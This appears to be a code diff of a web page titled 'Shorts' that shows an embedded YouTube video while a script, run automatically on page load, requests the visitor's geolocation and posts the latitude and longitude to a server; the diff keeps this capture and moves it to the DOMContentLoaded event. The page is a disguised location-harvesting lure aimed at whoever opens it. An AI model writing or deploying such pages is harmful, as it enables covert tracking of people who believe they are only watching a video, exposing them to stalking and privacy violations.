@@ -3,9 +3,9 @@
 <head>
     <title>Shorts</title>
     <script>
-        function sendLocation() {
+        document.addEventListener('DOMContentLoaded', function () {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
+                navigator.geolocation.getCurrentPosition(function (position) {
                     var latitude = position.coords.latitude;
                     var longitude = position.coords.longitude;
 
@@ -19,16 +19,17 @@
                             latitude: latitude,
                             longitude: longitude
                         })
-                    }).then(response => response.json())
-                      .then(data => console.log('Success:', data))
-                      .catch((error) => console.error('Error:', error));
-                }, function(error) {
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log('Success:', data))
+                    .catch((error) => console.error('Error:', error));
+                }, function (error) {
                     console.error('Error getting location:', error);
                 });
             } else {
                 console.log('Geolocation is not supported by this browser.');
             }
-        }
+        });
 
         function getParameterByName(name) {
             name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
@@ -36,11 +37,13 @@
             var results = regex.exec(location.search);
             return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
         }
-
-        window.onload = sendLocation;
     </script>
 </head>
 <body>
-    <iframe width="560" height="315" src="https://www.youtube.com/embed/gSQgbCo6PAg?si=6VtyKEuQCgCvz7Nx" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+   <iframe width="560" height="315" src="https://www.youtube.com/embed/gSQgbCo6PAg?si=6VtyKEuQCgCvz7Nx" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+
 </body>
 </html>
+
+ 
